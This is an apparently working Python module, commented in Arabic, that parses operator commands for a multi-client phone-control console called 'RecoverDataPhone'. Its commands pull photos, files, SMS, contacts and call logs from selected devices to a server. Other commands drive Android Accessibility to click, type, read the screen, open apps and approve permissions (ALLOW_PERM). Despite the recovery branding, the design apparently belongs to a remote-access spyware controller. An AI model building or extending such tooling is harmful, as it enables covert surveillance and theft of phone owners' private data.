#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
parser.py
============================================================
محلّل أوامر الطرفية (CLI).

المسؤوليات:
  1. تحويل نص المستخدم إلى أمر منظّم.
  2. دعم الاقتباسات والوسائط (Arguments).
  3. توفير قائمة الأوامر المدعومة + مساعدة.
  4. التحقق من صحة الأوامر قبل التنفيذ.

الصيغة المدعومة:
  GET PHOTOS [--limit N] [--offset N]
  GET VIDEO  [--limit N]
  GET FILE   <path>
  LIST DIR   <path>
  SESSIONS
  SELECT     <client_id>
  ACCESSIBILITY <action> [params...]
  HELP       [command]
  EXIT

الميزات:
  - كشف الأخطاء المطبعية برسائل واضحة.
  - دعم الاقتباسات للنصوص التي تحتوي مسافات.
  - Ignore case (حساسية حالة الأحرف غير مهمة).
  - قيم افتراضية للوسائط.

الاستخدام:
  parser = CommandParser()
  cmd = parser.parse("GET PHOTOS --limit 50")
  if cmd.valid:
      print(cmd.name, cmd.args)  # "GET_PHOTOS", {"limit": 50}
============================================================
"""

import logging
import shlex
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional

logger = logging.getLogger("parser")


# ============================================================
# 1. نموذج الأمر (Command)
# ============================================================
@dataclass
class ParsedCommand:
    """يمثّل أمراً بعد التحليل."""
    name: str = ""                          # الاسم المعياري (مثل "GET_PHOTOS")
    raw: str = ""                           # النص الأصلي
    args: Dict[str, Any] = field(default_factory=dict)  # الوسائط
    valid: bool = True                      # صالح؟
    error: str = ""                         # رسالة خطأ إن وُجد

    def __repr__(self) -> str:
        if not self.valid:
            return f"<ParsedCommand INVALID: {self.error}>"
        return f"<ParsedCommand {self.name} {self.args}>"


# ============================================================
# 2. ثوابت الأوامر
# ============================================================
# صيغة: (الاسم المعياري, [المرادفات المحتملة])
COMMANDS: Dict[str, List[str]] = {
    # ----- البيانات -----
    "GET_PHOTOS":       ["GET PHOTOS", "PHOTOS", "GET_PICS"],
    "GET_VIDEOS":       ["GET VIDEOS", "GET VIDEO", "VIDEOS", "VIDEO"],
    "GET_FILE":         ["GET FILE", "FILE"],
    "LIST_DIR":         ["LIST DIR", "LS", "LIST"],
    "GET_DEVICE_INFO":  ["INFO", "DEVICE INFO", "GET INFO"],
    "GET_CONTACTS":     ["CONTACTS"],
    "GET_SMS":          ["SMS", "MESSAGES"],
    "GET_CALL_LOGS":    ["CALLS", "CALL LOGS"],

    # ----- Accessibility -----
    "ACCESSIBILITY":    ["A11Y", "ACCESS"],

    # ----- الجلسات -----
    "SESSIONS":         ["LIST SESSIONS", "CLIENTS", "LIST CLIENTS"],
    "SELECT":           ["USE", "SWITCH"],

    # ----- التحكم -----
    "PING":             ["PING"],
    "STOP":             ["STOP"],

    # ----- الطرفية -----
    "HELP":             ["?", "H"],
    "CLEAR":            ["CLS"],
    "EXIT":             ["QUIT", "Q"],
}

# أوامر Accessibility الفرعية
ACCESSIBILITY_ACTIONS = {
    "HOME":         [],
    "BACK":         [],
    "RECENTS":      [],
    "NOTIFICATIONS":[],
    "LOCK":         [],
    "CLICK":        ["x", "y"],
    "LONG_CLICK":   ["x", "y"],
    "SWIPE":        ["x1", "y1", "x2", "y2"],
    "TEXT":         ["text"],
    "SCROLL":       ["direction"],
    "FIND_CLICK":   ["text"],
    "DUMP_UI":      [],
    "GET_PACKAGE":  [],
    "OPEN_APP":     ["package"],
    "OPEN_SETTINGS":[],
    "ALLOW_PERM":   [],
}


# ============================================================
# 3. CommandParser
# ============================================================
class CommandParser:
    """
    محلّل أوامر الطرفية.
    """

    def __init__(self):
        # خريطة المرادفات → الاسم المعياري
        self._aliases: Dict[str, str] = {}
        for canonical, aliases in COMMANDS.items():
            self._aliases[canonical.lower()] = canonical
            for alias in aliases:
                self._aliases[alias.lower()] = canonical

    # ========================================================
    # 3.1 الدالة الرئيسية
    # ========================================================
    def parse(self, raw_line: str) -> ParsedCommand:
        """
        تحليل سطر من المستخدم إلى ParsedCommand.
        """
        raw = (raw_line or "").strip()
        if not raw:
            return ParsedCommand(valid=False, error="Empty command", raw=raw)

        # -------- محاولة استخدام shlex للاقتباسات --------
        try:
            tokens = shlex.split(raw)
        except ValueError as e:
            return ParsedCommand(
                valid=False,
                error=f"Invalid quoting: {e}",
                raw=raw,
            )

        if not tokens:
            return ParsedCommand(valid=False, error="Empty command", raw=raw)

        # -------- مطابقة الأمر --------
        return self._match_command(tokens, raw)

    # ========================================================
    # 3.2 مطابقة الأمر
    # ========================================================
    def _match_command(self, tokens: List[str], raw: str) -> ParsedCommand:
        """
        البحث عن أطول مطابقة ممكنة من الرموز.
        مثال: ["GET", "PHOTOS"] → "GET_PHOTOS"
        """
        # جرّب من أطول تطابق إلى الأقصر
        for length in range(min(len(tokens), 3), 0, -1):
            candidate = " ".join(tokens[:length]).lower()
            canonical = self._aliases.get(candidate)

            if canonical:
                remaining = tokens[length:]
                return self._build_command(canonical, remaining, raw)

        # لم نجد مطابقة
        return ParsedCommand(
            valid=False,
            error=f"Unknown command: '{tokens[0]}'. Type 'help' for available commands.",
            raw=raw,
        )

    # ========================================================
    # 3.3 بناء الأمر حسب نوعه
    # ========================================================
    def _build_command(self, name: str, args_tokens: List[str], raw: str) -> ParsedCommand:
        """
        بناء ParsedCommand حسب نوع الأمر.
        """
        cmd = ParsedCommand(name=name, raw=raw)

        # -------- التوجيه حسب الأمر --------
        try:
            if name == "GET_PHOTOS":
                cmd.args = self._parse_get_media(args_tokens)
            elif name == "GET_VIDEOS":
                cmd.args = self._parse_get_media(args_tokens)
            elif name == "GET_FILE":
                cmd.args = self._parse_get_file(args_tokens)
            elif name == "LIST_DIR":
                cmd.args = self._parse_list_dir(args_tokens)
            elif name == "SELECT":
                cmd.args = self._parse_select(args_tokens)
            elif name == "ACCESSIBILITY":
                cmd.args = self._parse_accessibility(args_tokens)
            elif name in ("GET_DEVICE_INFO", "SESSIONS", "PING", "STOP",
                          "CLEAR", "EXIT", "GET_CONTACTS", "GET_SMS",
                          "GET_CALL_LOGS"):
                cmd.args = {}
            elif name == "HELP":
                cmd.args = self._parse_help(args_tokens)
            else:
                cmd.args = {}

        except ValueError as e:
            cmd.valid = False
            cmd.error = str(e)

        return cmd

    # ========================================================
    # 3.4 محلّلات فرعية
    # ========================================================

    # ---------- GET PHOTOS / GET VIDEOS ----------
    def _parse_get_media(self, tokens: List[str]) -> Dict[str, Any]:
        """
        يدعم: --limit N --offset N --path <path>
        """
        result: Dict[str, Any] = {"limit": 0, "offset": 0, "path": None}

        i = 0
        while i < len(tokens):
            token = tokens[i]
            if token in ("--limit", "-l"):
                result["limit"] = self._parse_int(tokens, i, "--limit")
                i += 2
            elif token in ("--offset", "-o"):
                result["offset"] = self._parse_int(tokens, i, "--offset")
                i += 2
            elif token in ("--path", "-p"):
                result["path"] = self._parse_str(tokens, i, "--path")
                i += 2
            else:
                raise ValueError(f"Unexpected argument: {token}")
        return result

    # ---------- GET FILE ----------
    def _parse_get_file(self, tokens: List[str]) -> Dict[str, Any]:
        if not tokens:
            raise ValueError("GET FILE requires a path. Usage: GET FILE <path>")
        path = " ".join(tokens)  # يسمح بمسافات في المسار
        return {"path": path}

    # ---------- LIST DIR ----------
    def _parse_list_dir(self, tokens: List[str]) -> Dict[str, Any]:
        if not tokens:
            raise ValueError("LIST DIR requires a path. Usage: LIST DIR <path>")
        path = " ".join(tokens)
        return {"path": path}

    # ---------- SELECT ----------
    def _parse_select(self, tokens: List[str]) -> Dict[str, Any]:
        if not tokens:
            raise ValueError("SELECT requires a client ID. Usage: SELECT <id>")
        return {"client_id": tokens[0]}

    # ---------- ACCESSIBILITY ----------
    def _parse_accessibility(self, tokens: List[str]) -> Dict[str, Any]:
        if not tokens:
            raise ValueError(
                "ACCESSIBILITY requires an action. "
                f"Available: {', '.join(ACCESSIBILITY_ACTIONS.keys())}"
            )

        action = tokens[0].upper()
        if action not in ACCESSIBILITY_ACTIONS:
            raise ValueError(
                f"Unknown accessibility action: '{action}'. "
                f"Available: {', '.join(ACCESSIBILITY_ACTIONS.keys())}"
            )

        params = tokens[1:]
        expected = ACCESSIBILITY_ACTIONS[action]

        result: Dict[str, Any] = {"action": action}

        # تحويل الوسائط حسب النوع
        if action in ("CLICK", "LONG_CLICK"):
            if len(params) < 2:
                raise ValueError(f"{action} requires x and y. Usage: ACCESS {action} <x> <y>")
            result["x"] = self._to_float(params[0], "x")
            result["y"] = self._to_float(params[1], "y")

        elif action == "SWIPE":
            if len(params) < 4:
                raise ValueError(
                    "SWIPE requires x1 y1 x2 y2. "
                    "Usage: ACCESS SWIPE <x1> <y1> <x2> <y2> [duration]"
                )
            result["x1"] = self._to_float(params[0], "x1")
            result["y1"] = self._to_float(params[1], "y1")
            result["x2"] = self._to_float(params[2], "x2")
            result["y2"] = self._to_float(params[3], "y2")
            if len(params) >= 5:
                result["duration"] = self._to_int(params[4], "duration")

        elif action == "TEXT":
            if not params:
                raise ValueError("TEXT requires a string. Usage: ACCESS TEXT <text>")
            result["text"] = " ".join(params)

        elif action == "SCROLL":
            if not params:
                raise ValueError("SCROLL requires a direction. Usage: ACCESS SCROLL <up|down>")
            direction = params[0].lower()
            if direction not in ("up", "down", "left", "right"):
                raise ValueError(f"Invalid direction: '{direction}'")
            result["direction"] = direction

        elif action == "FIND_CLICK":
            if not params:
                raise ValueError("FIND_CLICK requires text. Usage: ACCESS FIND_CLICK <text>")
            result["text"] = " ".join(params)

        elif action == "OPEN_APP":
            if not params:
                raise ValueError("OPEN_APP requires a package. Usage: ACCESS OPEN_APP <package>")
            result["package"] = params[0]

        return result

    # ---------- HELP ----------
    def _parse_help(self, tokens: List[str]) -> Dict[str, Any]:
        if not tokens:
            return {"command": None}
        return {"command": tokens[0].upper()}

    # ========================================================
    # 3.5 أدوات تحويل
    # ========================================================
    @staticmethod
    def _parse_int(tokens: List[str], i: int, flag: str) -> int:
        if i + 1 >= len(tokens):
            raise ValueError(f"{flag} requires a value")
        try:
            return int(tokens[i + 1])
        except ValueError:
            raise ValueError(f"{flag} must be an integer, got '{tokens[i + 1]}'")

    @staticmethod
    def _parse_str(tokens: List[str], i: int, flag: str) -> str:
        if i + 1 >= len(tokens):
            raise ValueError(f"{flag} requires a value")
        return tokens[i + 1]

    @staticmethod
    def _to_float(value: str, name: str) -> float:
        try:
            return float(value)
        except ValueError:
            raise ValueError(f"{name} must be a number, got '{value}'")

    @staticmethod
    def _to_int(value: str, name: str) -> int:
        try:
            return int(value)
        except ValueError:
            raise ValueError(f"{name} must be an integer, got '{value}'")

    # ========================================================
    # 3.6 قائمة الأوامر (للـ HELP)
    # ========================================================
    @staticmethod
    def list_commands() -> List[str]:
        """إرجاع قائمة الأوامر الأساسية."""
        return sorted(COMMANDS.keys())

    @staticmethod
    def help_text(command: Optional[str] = None) -> str:
        """
        نص المساعدة لأمر معين أو للكل.
        """
        if command:
            return CommandParser._help_for(command)
        return CommandParser._help_general()

    @staticmethod
    def _help_general() -> str:
        return """
╔══════════════════════════════════════════════════════════╗
║            RecoverDataPhone - Command Reference           ║
╚══════════════════════════════════════════════════════════╝

📦  DATA COMMANDS
    GET PHOTOS [--limit N] [--offset N] [--path P]
        سحب الصور من الجهاز
    GET VIDEO [--limit N]
        سحب الفيديوهات
    GET FILE <path>
        سحب ملف محدد
    LIST DIR <path>
        عرض محتوى مجلد
    INFO
        معلومات الجهاز

🎮  ACCESSIBILITY
    ACCESS HOME | BACK | RECENTS
        أزرار النظام
    ACCESS CLICK <x> <y>
        نقرة على إحداثيات
    ACCESS SWIPE <x1> <y1> <x2> <y2>
        سحب
    ACCESS TEXT <text>
        كتابة نص
    ACCESS FIND_CLICK <text>
        نقر على عنصر بنصه
    ACCESS DUMP_UI
        قراءة شجرة الواجهة

👥  SESSIONS
    SESSIONS
        عرض الجلسات المتصلة
    SELECT <client_id>
        اختيار عميل للتحكم

⚙️  CONTROL
    PING
        اختبار الاتصال
    STOP
        إيقاف الأوامر

💻  TERMINAL
    HELP [command]
        مساعدة
    CLEAR
        مسح الشاشة
    EXIT
        خروج

أمثلة:
    > GET PHOTOS --limit 50
    > ACCESS CLICK 540 960
    > SELECT a3f8b2c1
    > GET FILE /sdcard/DCIM/photo.jpg
"""

    @staticmethod
    def _help_for(command: str) -> str:
        """مساعدة لأمر معين."""
        cmd = command.upper().replace(" ", "_")

        helps = {
            "GET_PHOTOS": "GET PHOTOS [--limit N] [--offset N] [--path <dir>]\n"
                          "  سحب الصور من الهاتف إلى السيرفر.\n"
                          "  --limit:  الحد الأقصى للعدد (0 = الكل)\n"
                          "  --offset: تخطي أول N صورة\n"
                          "  --path:   مسار مخصص",

            "GET_VIDEOS": "GET VIDEO [--limit N] [--offset N]\n"
                          "  سحب الفيديوهات من الهاتف.",

            "GET_FILE":   "GET FILE <path>\n"
                          "  سحب ملف محدد من الهاتف.\n"
                          "  مثال: GET FILE /sdcard/DCIM/photo.jpg",

            "LIST_DIR":   "LIST DIR <path>\n"
                          "  عرض محتوى مجلد على الهاتف.\n"
                          "  مثال: LIST DIR /sdcard/DCIM",

            "ACCESSIBILITY": "ACCESS <action> [params...]\n"
                             "  تنفيذ إجراء Accessibility.\n\n"
                             "  الأزرار: HOME, BACK, RECENTS, NOTIFICATIONS\n"
                             "  اللمس: CLICK x y | LONG_CLICK x y\n"
                             "  السحب: SWIPE x1 y1 x2 y2 [duration]\n"
                             "  النص:  TEXT <text>\n"
                             "  البحث: FIND_CLICK <text>\n"
                             "  التمرير: SCROLL <up|down|left|right>\n"
                             "  القراءة: DUMP_UI | GET_PACKAGE\n"
                             "  التطبيقات: OPEN_APP <package> | OPEN_SETTINGS",

            "SESSIONS":   "SESSIONS\n"
                          "  عرض جميع الجلسات المتصلة.",

            "SELECT":     "SELECT <client_id>\n"
                          "  اختيار عميل للتحكم به.\n"
                          "  مثال: SELECT a3f8b2c1",

            "PING":       "PING\n"
                          "  إرسال Ping للعميل المحدد لاختبار الاتصال.",
        }

        if cmd in helps:
            return f"\n📖 {cmd}\n{'─' * 50}\n{helps[cmd]}\n"

        # بحث بالاسم الأصلي
        for key, aliases in COMMANDS.items():
            if command.lower() in aliases or command.lower() == key.lower():
                return f"\n📖 {key}\n{'─' * 50}\n(لا توجد مساعدة مفصّلة لهذا الأمر)\n"

        return f"❓ لا توجد مساعدة للأمر: {command}"